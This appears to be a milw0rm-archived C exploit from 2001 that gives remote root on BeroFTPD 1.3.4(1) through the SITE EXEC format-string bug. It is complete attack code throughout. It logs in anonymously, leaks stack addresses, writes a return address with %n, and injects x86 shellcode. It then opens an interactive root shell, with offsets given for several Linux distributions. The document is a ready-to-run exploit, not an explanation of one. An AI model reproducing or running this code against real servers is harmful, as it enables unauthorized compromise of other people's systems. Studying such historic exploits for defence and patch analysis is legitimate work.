<html><head><title>BeroFTPD 1.3.4(1) Linux x86 Remote Root Exploit </title></head><pre>/*  
 *  BeroFTPD 1.3.4(1) Linux x86 remote root exploit 
 *  by qitest1 - 5/05/2001
 *
 *  BeroFTPD is an ftpd derived from wuftpd sources. This code
 *  exploits the format bug of the site exec cmd, well known to be
 *  present in wuftpd-2.6.0 and derived daemons. BeroFTPD 1.3.4(1) 
 *  is the current version at the moment.    
 *  
 *  JUST SAMPLE CODE. For different platforms you have to try with
 *  different offsets for different retaddrs. You see.. =)   
 *
 *  Greets: Nail, Norby, Berserker.
 *  69 rulez.. ;P
 */

#include &lt;stdio.h&gt; 
#include &lt;stdlib.h&gt; 
#include &lt;getopt.h&gt;
#include &lt;errno.h&gt; 
#include &lt;netdb.h&gt;
#include &lt;unistd.h&gt;
#include &lt;string.h&gt;
#include &lt;netinet/in.h&gt;

struct targ
{
   int			def;
   char 		*descr;
   unsigned long int 	enbuf;
   int			dawlen;
};

struct targ target[]=
    {			
      {0, &quot;RedHat 6.2 with BeroFTPD 1.3.4(1) from tar.gz&quot;, 0xded, 6},
      {1, &quot;Slackware 7.0 with BeroFTPD 1.3.4(1) from tar.gz&quot;, 0x1170, 12}, 
      {2, &quot;Mandrake 7.1 with BeroFTPD 1.3.4(1) from rpm&quot;, 0xdf1, 6}, 
      {69, NULL, 0, 0}
    };

  /* 15 byte x86/linux PIC read() shellcode by lorian / teso
   */
unsigned char shellcode_read[] =
        &quot;\x33\xdb&quot;              /* xorl %ebx, %ebx      */
        &quot;\xf7\xe3&quot;              /* mull %ebx            */
        &quot;\xb0\x03&quot;              /* movb $3, %al         */
        &quot;\x8b\xcc&quot;              /* movl %esp, %ecx      */
        &quot;\x68\xb2\x00\xcd\x80&quot;  /* push 0x80CDxxB2      */
        &quot;\xff\xff\xe4&quot;;         /* jmp  %esp            */

unsigned char shellcode[] =	/* Lam3rZ code */
        &quot;\x31\xc0\x31\xdb\x31\xc9\xb0\x46\xcd\x80\x31\xc0&quot;
        &quot;\x31\xdb\x43\x89\xd9\x41\xb0\x3f\xcd\x80\xeb\x6b&quot;
        &quot;\x5e\x31\xc0\x31\xc9\x8d\x5e\x01\x88\x46\x04\x66&quot;
        &quot;\xb9\xff\x01\xb0\x27\xcd\x80\x31\xc0\x8d\x5e\x01&quot;
        &quot;\xb0\x3d\xcd\x80\x31\xc0\x31\xdb\x8d\x5e\x08\x89&quot;
        &quot;\x43\x02\x31\xc9\xfe\xc9\x31\xc0\x8d\x5e\x08\xb0&quot;
        &quot;\x0c\xcd\x80\xfe\xc9\x75\xf3\x31\xc0\x88\x46\x09&quot;
        &quot;\x8d\x5e\x08\xb0\x3d\xcd\x80\xfe\x0e\xb0\x30\xfe&quot;
        &quot;\xc8\x88\x46\x04\x31\xc0\x88\x46\x07\x89\x76\x08&quot;
        &quot;\x89\x46\x0c\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xb0&quot;
        &quot;\x0b\xcd\x80\x31\xc0\x31\xdb\xb0\x01\xcd\x80\xe8&quot;
        &quot;\x90\xff\xff\xff\x30\x62\x69\x6e\x30\x73\x68\x31&quot;
        &quot;\x2e\x2e\x31\x31&quot;;

char 		  	fmtstr[1024];
int			sock;
int			sel;
int			offset;
unsigned long int       retloc;
unsigned long int 	bufaddr;
unsigned long int	tmpaddr;
	
void 		fmtstr_build(unsigned long int bufaddr, unsigned long int retloc);
void 		xpad_cat (unsigned char *fabuf, unsigned long int addr);
void 		retloc_find(void);
void 		shellami(int sock);
void		login(void);
void		usage(char *progname);
int 		conn2host(char *host, int port);

main(int argc, char *argv[])
{
char		rbuf[1024];
char		*host = NULL;
int 		cnt;

  printf(&quot;\n  BeroFTPD 1.3.4(1) exploit by qitest1\n\n&quot;);
  if(argc == 1)
	usage(argv[0]);
  while((cnt = getopt(argc,argv,&quot;h:t:o:&quot;)) != EOF)
    {
   switch(cnt)
        {
   case 'h':
      host = strdup(optarg);
      break;
   case 't':
     sel = atoi(optarg);       
     break;
   case 'o':
     offset = atoi(optarg);
     break;
   default:
     usage(argv[0]);
     break;
        }
    }

  if(host == NULL)
	usage(argv[0]);

  printf(&quot;+Host: %s\n  as: %s\n&quot;, host, target[sel].descr);

  printf(&quot;+Connecting to %s...\n&quot;, host);
  sock = conn2host(host, 21);
  printf(&quot;  connected\n&quot;);

  printf(&quot;+Receiving banner...\n&quot;);
  recv(sock, rbuf, 1024, 0);
  printf(&quot;%s&quot;, rbuf);
  memset(rbuf, 0, 1024);
  printf(&quot;  received\n&quot;);

  printf(&quot;+Logging in...\n&quot;);
  login();
  printf(&quot;  logged in\n&quot;);

  printf(&quot;+Searching retloc...\n&quot;);
  retloc_find();
  printf(&quot;  found: %p\n&quot;, retloc);

  printf(&quot;+Searching bufaddr...\n&quot;);
  bufaddr = tmpaddr + target[sel].enbuf;
  printf(&quot;  found: %p + offset = &quot;, bufaddr);
  bufaddr += offset;
  printf(&quot;%p\n&quot;, bufaddr);  

  printf(&quot;+Preparing shellcode...\n&quot;);
  shellcode_read[strlen(shellcode_read)] = (unsigned char) strlen(shellcode);
  printf(&quot;  shellcode ready\n&quot;);

  printf(&quot;+Building fmtstr...\n&quot;);
  fmtstr_build(bufaddr, retloc);
  printf(&quot;  fmtstr builded\n&quot;);  
  
  printf(&quot;+Sending fmtstr...\n&quot;);
  send(sock, fmtstr, strlen(fmtstr), 0);
  printf(&quot;  fmtstr sent\n&quot;);
  recv(sock, rbuf, 1024, 0);
  sleep(1);
  send(sock, shellcode, strlen(shellcode), 0);
  sleep(2);
  printf(&quot;+Entering love mode...\n&quot;);  /* Nail teachs.. ;-) */
  shellami(sock);  

}

void
fmtstr_build(unsigned long int bufaddr, unsigned long int retloc)
{
int               i;
int		  eat = 136;
int               wlen = 428;
int               tow;
int               freespz;
char		  f[1024];
unsigned long int soul69 = 0x69696969;  /* That's amore.. =) */
unsigned char     retaddr[4];

  for(i = 0; i &lt; 4; ++i)
	retaddr[i] = (bufaddr &gt;&gt; (i &lt;&lt; 3)) &amp; 0xff;

  wlen -= target[sel].dawlen;
  f[0] = 0;
  for(i = 0; i &lt; eat; i++)
        strcat(f, &quot;%.f&quot;);

  strcat(fmtstr, &quot;SITE EXEC &quot;);
  strcat(fmtstr, &quot;  &quot;);
  xpad_cat(fmtstr, retloc);
  xpad_cat(fmtstr, soul69);
  xpad_cat(fmtstr, retloc + 1);
  xpad_cat(fmtstr, soul69);
  xpad_cat(fmtstr, retloc + 2);
  xpad_cat(fmtstr, soul69);
  xpad_cat(fmtstr, retloc + 3);
  strcat(fmtstr, f);
  strcat(fmtstr, &quot;%x&quot;);

  /* Code by teso
   */
  tow = ((retaddr[0] + 0x100) - (wlen % 0x100)) % 0x100;
  if (tow &lt; 10) tow += 0x100;     
  sprintf (fmtstr + strlen (fmtstr), &quot;%%%dd%%n&quot;, tow);
  wlen += tow;

  tow = ((retaddr[1] + 0x100) - (wlen % 0x100)) % 0x100;
  if (tow &lt; 10) tow += 0x100;
  sprintf (fmtstr + strlen (fmtstr), &quot;%%%dd%%n&quot;, tow);
  wlen += tow;

  tow = ((retaddr[2] + 0x100) - (wlen % 0x100)) % 0x100;
  if (tow &lt; 10) tow += 0x100;
  sprintf (fmtstr + strlen (fmtstr), &quot;%%%dd%%n&quot;, tow);
  wlen += tow;

  tow = ((retaddr[3] + 0x100) - (wlen % 0x100)) % 0x100;
  if (tow &lt; 10) tow += 0x100;
  sprintf (fmtstr + strlen (fmtstr), &quot;%%%dd%%n&quot;, tow);
  wlen += tow;
  /* End here
   */

  freespz = 510 - strlen(fmtstr) - strlen(shellcode_read) - 1;
  for(i = 0; i &lt; freespz ; i++)
	strcat(fmtstr, &quot;\x90&quot;);
  strcat(fmtstr, shellcode_read);

  strcat(fmtstr, &quot;\n&quot;);

}

  /* Code by teso
   */
void xpad_cat (unsigned char *fabuf, unsigned long int addr)
{
        int             i;
        unsigned char   c;

        for (i = 0 ; i &lt;= 3 ; ++i) {
                switch (i) {
                case (0):
                        c = (unsigned char) ((addr &amp; 0x000000ff)      );
                        break;
                case (1):
                        c = (unsigned char) ((addr &amp; 0x0000ff00) &gt;&gt;  8);
                        break;
                case (2):
                        c = (unsigned char) ((addr &amp; 0x00ff0000) &gt;&gt; 16);
                        break;
                case (3):
                        c = (unsigned char) ((addr &amp; 0xff000000) &gt;&gt; 24);
                        break;
                }
                if (c == 0xff)
                        sprintf (fabuf + strlen (fabuf), &quot;%c&quot;, c);

                sprintf (fabuf + strlen (fabuf), &quot;%c&quot;, c);
        }

        return;
}
  /* End here
   */

void
retloc_find(void)
{
int		i;
char		rbuf[1024];
char		sbuf[1024];
char		*ptr;

  strcpy(sbuf, &quot;SITE EXEC &quot;);
  for(i = 0; i &lt; 6; i++)
	strcat(sbuf, &quot;%p &quot;);
  strcat(sbuf, &quot;\n&quot;);
  send(sock, sbuf, strlen(sbuf), 0); 

  recv(sock, rbuf, 1024, 0);
  ptr = rbuf;
  for(i = 0; i &lt; 5; i++)
	{
	  while(*ptr != ' ')
	  	ptr++;
	  ptr++;
	}
  ptr[strlen(ptr) - 2] = '\x00';	
  ptr[strlen(ptr) - 1] = '\x00';
  sscanf(ptr, &quot;%p&quot;, &amp;retloc);
  sscanf(ptr, &quot;%p&quot;, &amp;tmpaddr);
  retloc -= 0x40;

}

void
shellami(int sock)
{
int 		n;
char 		recvbuf[1024];
char		*cmd = &quot;id; uname -a\n&quot;;
fd_set 		rset;

  send(sock, cmd, strlen(cmd), 0);

  while (1)
    {
      FD_ZERO(&amp;rset);
      FD_SET(sock,&amp;rset);
      FD_SET(STDIN_FILENO,&amp;rset);
      select(sock+1,&amp;rset,NULL,NULL,NULL);
      if (FD_ISSET(sock,&amp;rset))
        {
          n=read(sock,recvbuf,1024);
          if (n &lt;= 0)
            {
              printf(&quot;Connection closed by foreign host.\n&quot;);
              exit(0);
            }
          recvbuf[n]=0;
          printf(&quot;%s&quot;,recvbuf);
        }
      if (FD_ISSET(STDIN_FILENO,&amp;rset))
        {
          n=read(STDIN_FILENO,recvbuf,1024);
          if (n&gt;0)
            {
              recvbuf[n]=0;
              write(sock,recvbuf,n);
            }
        }
    }
  return;
}

int
conn2host(char *host, int port)
{
int 		sockfd;  
struct 		hostent *he;
struct 		sockaddr_in their_addr; 

  if ((he=gethostbyname(host)) == NULL)
	{ 
          herror(&quot;gethostbyname&quot;);
          exit(1);
	}
  if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
	{
          perror(&quot;socket&quot;);
          exit(1);
	}

  their_addr.sin_family = AF_INET;     
  their_addr.sin_port = htons(port);   
  their_addr.sin_addr = *((struct in_addr *)he-&gt;h_addr);
  bzero(&amp;(their_addr.sin_zero), 8);     

  if(connect(sockfd, (struct sockaddr *)&amp;their_addr, sizeof(struct sockaddr)) == -1)
	{
          perror(&quot;connect&quot;);
          exit(1);
	}
 
  return(sockfd);

}

void
login(void)
{
char		*user = &quot;USER anonymous\n&quot;;
char		*pass = &quot;PASS guest@\n&quot;;
char		rbuf[1024];

  send(sock, user, strlen(user), 0);
  recv(sock, rbuf, 1024, 0);
  memset(rbuf, 0, 1024);
  send(sock, pass, strlen(pass), 0);
  while(strstr(rbuf, &quot;login ok&quot;) == NULL)
	{
	  memset(rbuf, 0, 1024);
	  recv(sock, rbuf, 1024, 0);
	}

}

void
usage(char *progname)
{
int		i = 0;
  
  printf(&quot;Usage: %s [options]\n&quot;, progname);
  printf(&quot;Options:\n&quot;
	 &quot;  -h hostname\n&quot;
	 &quot;  -t target\n&quot;
	 &quot;  -o offset\n&quot;
	 &quot;Available targets:\n&quot;);
  while(target[i].def != 69)
	{ 
          printf(&quot;  %d) %s\n&quot;, target[i].def, target[i].descr);
          i++;
	} 

  exit(1);

}


// milw0rm.com [2001-05-08]</pre></html>